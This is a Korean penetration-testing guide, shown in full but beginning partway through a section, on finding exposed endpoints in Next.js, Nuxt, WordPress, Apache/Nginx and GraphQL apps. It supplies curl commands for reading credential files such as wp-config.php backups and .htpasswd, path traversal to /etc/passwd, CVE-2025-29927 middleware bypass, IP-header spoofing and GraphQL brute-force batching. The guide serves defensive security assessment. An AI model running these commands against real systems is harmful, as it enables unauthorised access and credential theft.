curl -sS https://<TARGET>/_next/static/buildManifest.js
# 또는 __NEXT_DATA__의 buildId 필드에서 확인

# 서버 데이터 직접 접근
curl -sS "https://<TARGET>/_next/data/<BUILD_ID>/dashboard.json"

# 이미지 프록시 SSRF 테스트
curl -sS "https://<TARGET>/_next/image?url=http://internal-host/&w=256&q=75"

# 미들웨어 인증 우회 (CVE-2025-29927)
curl -sS -H "x-middleware-subrequest: middleware" https://<TARGET>/admin

# source map 확인
curl -sS "https://<TARGET>/_next/static/chunks/main-<HASH>.js.map"

# 클라이언트 번들에서 NEXT_PUBLIC_ 환경변수 검색
curl -sS https://<TARGET>/_next/static/chunks/main-<HASH>.js | grep -o "NEXT_PUBLIC_[A-Z_]*"
```

#### Nuxt

| 경로·기능 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/_payload.json` | 🟡 Medium | SSR 페이지의 직렬화된 서버 데이터 |
| `/_nuxt/` | 🟢 Low | 빌드 산출물 디렉터리 |
| `/api/` | 🟡 Medium | Nitro 서버 라우트 |
| `__NUXT__` / `__NUXT_DATA__` | 🟡 Medium | 페이지 HTML에 포함된 서버 측 상태 |
| `/_nuxt/builds/meta/<ID>.json` | 🟡 Medium | Nuxt 3 빌드 메타데이터 |
| Nuxt DevTools | 🔴 High | 개발 모드 디버그 도구. 컴포넌트, 상태, 라우트, 모듈 정보 |
| source map (`.js.map`) | 🔴 High | 원본 소스 코드 노출 |

```bash
# 페이로드 데이터
curl -sS https://<TARGET>/_payload.json
curl -sS https://<TARGET>/dashboard/_payload.json

# 빌드 메타데이터
curl -sS https://<TARGET>/_nuxt/builds/latest.json

# 서버 API 라우트 탐색
curl -sS https://<TARGET>/api/
curl -sS https://<TARGET>/api/users
```

**확인할 것**: `__NEXT_DATA__`와 `_payload.json`에는 서버에서 렌더링에 사용한 데이터가 그대로 포함된다. 페이지에 표시하지 않는 필드(내부 ID, 권한 정보, 다른 사용자 데이터)가 포함되어 있는지 확인한다. `/_next/image` 프록시는 `next.config.js`의 `domains`나 `remotePatterns` 설정으로 제한되지만, 와일드카드 설정이나 리다이렉트 체인으로 우회 가능한 경우가 있다. CVE-2025-29927은 Next.js 미들웨어로 인증을 처리하는 경우에만 해당된다.

---

### 10. WordPress

WordPress는 전 세계 웹사이트의 큰 비중을 차지하며, REST API와 XML-RPC가 기본 활성화되어 있다.

**식별 확인:**

```bash
# Generator 메타 태그
curl -sS https://<TARGET>/ | grep 'generator.*WordPress'
# <meta name="generator" content="WordPress 6.X.X" />

# 기본 경로 존재
curl -sI https://<TARGET>/wp-login.php
curl -sI https://<TARGET>/wp-admin/
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/wp-json/wp/v2/users` | 🔴 High | 사용자 목록 열거. 사용자명, slug, 프로필 정보 |
| `/?author=1` | 🟡 Medium | 사용자명 열거. 리다이렉트 URL에 slug 포함 |
| `/xmlrpc.php` | 🔴 High | XML-RPC. 다중 인증 시도(multicall), SSRF, DDoS amplification |
| `/wp-content/debug.log` | 🔴 Critical | PHP 에러 로그. DB 쿼리, 파일 경로, 플러그인 에러 |
| `/wp-config.php.bak` | 🔴 Critical | DB 자격증명, AUTH_KEY, SALT 값 |
| `/wp-config.php~` | 🔴 Critical | 에디터 백업 파일 |
| `/readme.html` | 🟢 Low | WordPress 버전 정보 |
| `/wp-cron.php` | 🟡 Medium | WP-Cron. 예약 작업 트리거, DDoS 벡터 |
| `/wp-content/uploads/` | 🟡 Medium | 업로드 디렉터리 리스팅. 파일 구조 노출 |
| `/wp-includes/` | 🟢 Low | 코어 파일. 버전 확인 |
| `/wp-json/` | 🟡 Medium | REST API 루트. 전체 endpoint 목록 |
| `/wp-admin/install.php` | 🔴 Critical | 설치 마법사가 접근 가능하면 DB 덮어쓰기 가능 |

#### REST API 사용자 열거

```bash
# 사용자 목록 (인증 불필요)
curl -sS https://<TARGET>/wp-json/wp/v2/users
# [{"id":1,"name":"admin","slug":"admin",...}]

# REST API 비활성화 시 대체 방법
curl -sS "https://<TARGET>/?rest_route=/wp/v2/users"

# author 파라미터 열거
curl -sI "https://<TARGET>/?author=1"
# Location: https://<TARGET>/author/admin/ ← slug 노출
```

#### XML-RPC 공격

```bash
# XML-RPC 활성 확인
curl -sS -X POST https://<TARGET>/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# multicall을 이용한 다중 인증 시도 (단일 요청에 수백 개 시도 가능)
# wp.getUsersBlogs에 사용자명·비밀번호 조합을 배열로 전달
```

```bash
# 플러그인·테마 열거 (wpscan)
wpscan --url https://<TARGET>/ --enumerate p,t,u

# 디버그 로그
curl -sS https://<TARGET>/wp-content/debug.log

# 설정 파일 백업
curl -sS https://<TARGET>/wp-config.php.bak
curl -sS https://<TARGET>/wp-config.php~
curl -sS https://<TARGET>/wp-config.php.old
curl -sS https://<TARGET>/wp-config.php.save
```

**확인할 것**: `/wp-json/wp/v2/users`에서 사용자 목록이 반환되면 열거된 사용자명으로 `/wp-login.php` 또는 `xmlrpc.php`에 대한 인증 공격이 가능하다. `xmlrpc.php`의 `system.multicall`은 단일 HTTP 요청에 수백 개의 인증 시도를 포함할 수 있어 속도 제한을 우회한다. `debug.log`는 `WP_DEBUG_LOG`가 활성화된 상태에서 생성되며, PHP 에러에 포함된 DB 쿼리·파일 경로·플러그인 정보가 후속 공격에 직접 사용된다.

---

### 11. 웹서버 (Apache / Nginx)

프레임워크가 아닌 웹서버 자체의 상태·정보 모듈이 외부에 노출되는 경우를 점검한다.

**식별 확인:**

```bash
curl -sI https://<TARGET>/
# Server: Apache/2.4.XX (Ubuntu)
# Server: nginx/1.XX.X
```

#### Apache

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/server-status` | 🔴 High | 현재 연결, 요청 URL, 클라이언트 IP, vhost. `ExtendedStatus On`이면 상세 |
| `/server-info` | 🔴 High | 전체 모듈 목록, 설정 지시어, 핸들러 |
| `/.htaccess` | 🔴 High | 접근 제어·리라이트 규칙. 인증 로직 파악 가능 |
| `/.htpasswd` | 🔴 Critical | 사용자명과 비밀번호 해시 |
| `/icons/` | 🟢 Low | Apache 기본 아이콘 디렉터리. 설치 확인 |
| 기본 페이지 | 🟢 Low | "It works!" 또는 배포판 기본 페이지 |

```bash
# server-status (ExtendedStatus 포함)
curl -sS https://<TARGET>/server-status
curl -sS https://<TARGET>/server-status?auto

# server-info
curl -sS https://<TARGET>/server-info

# 접근 제어 파일
curl -sS https://<TARGET>/.htaccess
curl -sS https://<TARGET>/.htpasswd
```

`server-status`는 현재 처리 중인 요청 URL이 표시되므로, 다른 사용자의 세션 토큰이 URL 파라미터에 포함되어 있으면 세션 하이재킹으로 이어진다.

#### Nginx

| 경로·설정 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/nginx_status` 또는 `/stub_status` | 🟡 Medium | 활성 연결 수, 요청 수 등 기본 통계 |
| alias traversal | 🔴 High | `location /static { alias /data/; }` 에서 `/static../etc/passwd` |
| off-by-slash | 🔴 High | `location /api { proxy_pass http://backend/; }` 에서 `/api../` |
| 기본 페이지 | 🟢 Low | "Welcome to nginx!" |

```bash
# stub_status
curl -sS https://<TARGET>/nginx_status
curl -sS https://<TARGET>/stub_status
curl -sS https://<TARGET>/status

# Nginx alias traversal 테스트
# location /static { alias /data/static/; } 설정에서
curl -sS https://<TARGET>/static../etc/passwd
```

#### Nginx alias traversal

Nginx의 `alias` 지시어에서 `location` 경로 끝에 `/`가 없고 `alias` 경로 끝에 `/`가 있으면 경로 탈출이 가능하다.

```nginx
# 취약한 설정
location /static {
    alias /data/static/;
}
# /static../secret.txt → /data/secret.txt 로 해석됨

# 안전한 설정
location /static/ {
    alias /data/static/;
}
```

**확인할 것**: Apache `server-status`는 기본적으로 로컬 접근만 허용하지만, 리버스 프록시 뒤에서 `X-Forwarded-For`로 우회되거나 설정 실수로 전체 공개되는 경우가 있다. Nginx `stub_status`는 연결 수 정도만 보여주므로 단독으로는 위험도가 낮지만, 내부 네트워크에서 접근 가능한 상세 상태 모듈(`ngx_http_status_module`)이 있는지 별도로 확인한다.

---

### 12. GraphQL

GraphQL은 프레임워크에 독립적이지만, introspection과 IDE 도구가 기본 활성화된 경우가 많다.

**식별 확인:**

```bash
# 공통 endpoint에 POST 요청
curl -sS -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'
# {"data":{"__typename":"Query"}} → GraphQL 확인
```

#### 점검 경로

| 경로 | 위험도 | 노출 정보 |
| :--- | :--- | :--- |
| `/graphql` | — | 기본 endpoint |
| `/graphiql` | 🟡 Medium | GraphiQL IDE. 쿼리 실행, 문서 탐색 |
| `/playground` | 🟡 Medium | GraphQL Playground. 동일 기능 |
| `/altair` | 🟡 Medium | Altair GraphQL Client |
| `/v1/graphql`, `/v1/explorer` | 🟡 Medium | 버전 접두사 변형 |
| `/graphql/console` | 🟡 Medium | Hasura Console 등 |
| introspection query | 🔴 High | 전체 스키마. 타입, 필드, 인자, 설명 |

#### Introspection 쿼리

introspection이 활성화되면 전체 API 스키마를 한 번에 가져올 수 있다.

```bash
# 전체 스키마 introspection
curl -sS -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}'

# 간단한 introspection 확인
curl -sS -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } } }"}'
```

#### 필드 제안 (Field Suggestions)

introspection이 비활성화되어도 잘못된 필드명을 보내면 올바른 필드명을 제안하는 경우가 있다.

```bash
curl -sS -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwor } }"}'
# {"errors":[{"message":"Cannot query field \"passwor\" on type \"User\". Did you mean \"password\"?"}]}
```

이 제안 기능으로 introspection 없이도 스키마를 점진적으로 파악할 수 있다. [Clairvoyance](https://github.com/nikitastupin/clairvoyance) 같은 도구가 이 과정을 자동화한다.

#### 쿼리 배칭

단일 HTTP 요청에 여러 쿼리를 배열로 보내 속도 제한을 우회할 수 있다.

```bash
curl -sS -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation { login(user:\"admin\",pass:\"pass1\") { token } }"},{"query":"mutation { login(user:\"admin\",pass:\"pass2\") { token } }"}]'
```

```text
공통 endpoint 후보:
/graphql          /gql             /query
/graphiql         /playground      /altair
/v1/graphql       /v2/graphql      /api/graphql
/graphql/console  /explorer        /graph
```

```bash
# 여러 경로 한번에 확인
for path in graphql gql graphiql playground altair v1/graphql api/graphql; do
  echo "=== /$path ===" && curl -sS -o /dev/null -w "%{http_code}" "https://<TARGET>/$path" && echo
done
```

**확인할 것**: introspection이 열려 있으면 전체 API 구조가 노출된다. 여기에는 mutation(데이터 변경)도 포함되므로 인증 없이 실행 가능한 mutation이 있는지 확인한다. GraphiQL/Playground 같은 IDE 도구가 열려 있으면 브라우저에서 직접 쿼리를 실행할 수 있으므로, 인증된 사용자의 쿠키가 자동 포함되는 경우 CSRF와 결합될 수 있다.

---

## 접근 제어 우회

기본 경로가 직접 접근으로 차단(`403`, `404`)되더라도, 경로 정규화·헤더·메서드 차이를 이용해 우회할 수 있다.

#### 경로 정규화

| 기법 | 예시 | 우회 원리 |
| :--- | :--- | :--- |
| trailing slash | `/actuator/env/` | 리버스 프록시가 `/actuator/env`만 차단하고 `/`를 붙인 요청을 통과시킴 |
| 이중 URL 인코딩 | `/actuator/%65nv` | WAF가 1차 디코딩만 수행하고 앱이 2차 디코딩을 수행 |
| path parameter | `/actuator/env;.css` | Spring이 세미콜론 이후를 path parameter로 무시 |
| 대소문자 | `/Actuator/Env` | Windows IIS에서 대소문자 무시 |
| dot segment | `/actuator/./env` 또는 `/../actuator/env` | 정규화 시점 차이 |
| null byte | `/actuator/env%00.html` | 일부 파서가 null 이후를 무시 |
| backslash | `/actuator\env` | IIS·일부 프록시에서 `/`로 정규화 |
| URL 인코딩 slash | `/actuator%2fenv` | 프록시와 앱의 디코딩 시점 차이 |

```bash
# trailing slash
curl -sS https://<TARGET>/actuator/env/

# path parameter (Spring)
curl -sS "https://<TARGET>/actuator/env;.css"
curl -sS "https://<TARGET>/actuator/env;.json"

# 이중 인코딩
curl -sS "https://<TARGET>/actuator/%65%6ev"

# dot segment
curl -sS "https://<TARGET>/actuator/./env"

# URL 인코딩 slash
curl -sS --path-as-is "https://<TARGET>/actuator%2fenv"
```

#### HTTP 메서드

```bash
# GET이 차단될 때 다른 메서드 시도
curl -sS -X POST https://<TARGET>/actuator/env
curl -sS -X OPTIONS https://<TARGET>/actuator/env
curl -sS -X HEAD https://<TARGET>/actuator/env
```

#### IP 기반 접근 제한 우회

내부 IP에서만 접근을 허용하는 설정을 우회하려는 시도.

```bash
curl -sS -H "X-Forwarded-For: 127.0.0.1" https://<TARGET>/actuator/env
curl -sS -H "X-Real-IP: 127.0.0.1" https://<TARGET>/actuator/env
curl -sS -H "X-Originating-IP: 127.0.0.1" https://<TARGET>/actuator/env
curl -sS -H "X-Custom-IP-Authorization: 127.0.0.1" https://<TARGET>/actuator/env
```

#### 프레임워크별 특수 우회

| 프레임워크 | 기법 | 예시 |
| :--- | :--- | :--- |
| Spring | 세미콜론 path parameter | `/env;.js`, `/actuator/env;bypass=1` |
| Spring | suffix pattern matching (이전 버전) | `/env.json`, `/env.xml` |
| Tomcat | URL 인코딩 backslash | `/manager/html/%5C..` |
| Nginx | off-by-slash alias | `/static../sensitive-file` |
| ASP.NET | 대소문자 무시 | `/ELMAH.AXD`, `/Trace.axd` |
| Rails | format 파라미터 | `/rails/info/routes.json` |
| WordPress | rest_route 파라미터 | `/?rest_route=/wp/v2/users` (REST API URL 재작성 차단 시) |

---

## 취약 판정 기준

### 확정

- 관리 콘솔(Tomcat Manager, Django Admin, Rails DB 등)에 기본·약한 자격증명으로 접근 가능하다.
- 디버그 모드(Werkzeug 디버거, Django DEBUG=True, Rails development 에러)가 외부에서 접근 가능하고 코드 실행 또는 환경변수·시크릿이 노출된다.
- 환경 파일(`.env`, `web.config`, `application.properties`)이 인증 없이 원문으로 반환되고 유효한 자격증명을 포함한다.
- Actuator `/env`, `/heapdump`, `/configprops`에서 DB 비밀번호, API 키, 시크릿이 노출된다.
- 사용자 열거 endpoint(WordPress REST API, Django admin)에서 사용자 목록이 인증 없이 반환된다.
- introspection으로 GraphQL 전체 스키마가 노출되고, 인증 없이 실행 가능한 민감 mutation이 존재한다.
- 로그 파일(`laravel.log`, `debug.log`)에서 다른 사용자의 세션·인증정보·개인정보가 포함된다.
- 알려진 CVE(Ignition RCE, Ghostcat, Next.js 미들웨어 우회)가 해당 버전에서 재현된다.

### 보류

- health·info endpoint가 일반 상태("UP", 빌드 해시)만 반환한다.
- API 문서(Swagger, FastAPI /docs, GraphQL IDE)가 열려 있지만 민감 endpoint가 인증으로 보호된다.
- 프레임워크 이름·버전이 에러 페이지나 헤더에서 확인되지만 추가 노출이 없다.
- `server-status`, `stub_status`에 연결 수 같은 일반 통계만 포함된다.
- 기본 예제 페이지(`/examples/`, `/docs/`)가 존재하지만 민감 기능 실행이 불가하다.
- `__NEXT_DATA__`나 `_payload.json`에 공개 페이지의 공개 데이터만 포함된다.

### 영향 상승

- 관리 콘솔 접근으로 코드 배포(WAR, plugin)나 설정 변경이 가능하다.
- 노출된 자격증명으로 운영 DB·클라우드·내부 API에 접근 가능하다.
- 디버그 콘솔에서 서버 코드 실행이 확인된다.
- 경로 우회로 인증이 필요한 관리 기능에 비인증 접근이 가능하다.
- 모니터링 endpoint에서 다른 사용자의 세션 토큰·요청 정보가 노출된다.
- 스키마·라우트 정보로 추가 취약점(IDOR, injection, 권한 우회)이 구체적으로 재현된다.

---

## 참고자료

### 공식 문서

- [Spring Boot Actuator - REST API](https://docs.spring.io/spring-boot/api/rest/actuator/)
- [Django - Deployment Checklist](https://docs.djangoproject.com/en/5.1/howto/deployment/checklist/)
- [Laravel - Configuration](https://laravel.com/docs/configuration)
- [ASP.NET Core - Health Checks](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/health-checks)
- [Next.js - Security](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [WordPress - REST API Handbook](https://developer.wordpress.org/rest-api/)
- [GraphQL - Introspection](https://graphql.org/learn/introspection/)
- [Nginx - ngx_http_stub_status_module](https://nginx.org/en/docs/http/ngx_http_stub_status_module.html)
- [Apache - mod_status](https://httpd.apache.org/docs/2.4/mod/mod_status.html)

### 테스트 가이드

- [OWASP WSTG - Enumerate Infrastructure and Application Admin Interfaces](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces)
- [OWASP WSTG - Fingerprint Web Application Framework](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework)
- [OWASP WSTG - Fingerprint Web Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server)

### 커뮤니티 참고 / 도구

- [HackTricks - Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
- [HackTricks - Werkzeug / Flask Debug](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)
- [HackTricks - GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [HackTricks - Nginx](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx)
- [PayloadsAllTheThings - GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- [Clairvoyance - GraphQL Schema Recovery](https://github.com/nikitastupin/clairvoyance)
- [WPScan](https://github.com/wpscanteam/wpscan)
- [SecLists - Web Content Discovery](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)
